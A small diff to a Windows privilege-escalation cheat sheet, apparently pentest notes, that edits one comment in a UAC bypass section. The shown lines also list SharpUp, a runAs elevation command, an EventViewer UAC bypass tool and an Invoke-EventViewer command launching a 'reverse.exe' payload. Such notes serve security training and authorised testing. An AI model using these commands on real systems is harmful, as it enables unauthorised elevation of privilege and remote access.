@@ -41,7 +41,7 @@
  8. Use SharUp if you cant run winpeas or powerup 
  9. `.\SharpUp.exe`
  ## UAC Bypass
- 1. `powershell.exe Start-Process cmd.exe -Verb runAs` run cmd as high integrity,(this is the case when we have admin access to folder but cant execute admin)
+ 1. `powershell.exe Start-Process cmd.exe -Verb runAs` run cmd as high integrity,(this is the case when we have admin access to folder but cant execute admin, run as admin )
  2. https://github.com/CsEnox/EventViewer-UACBypass
  3. `Invoke-EventViewer cmd.exe` or `Invoke-EventViewer "C:\full\path\to\reverse.exe`
  ## Service Misconfiguration
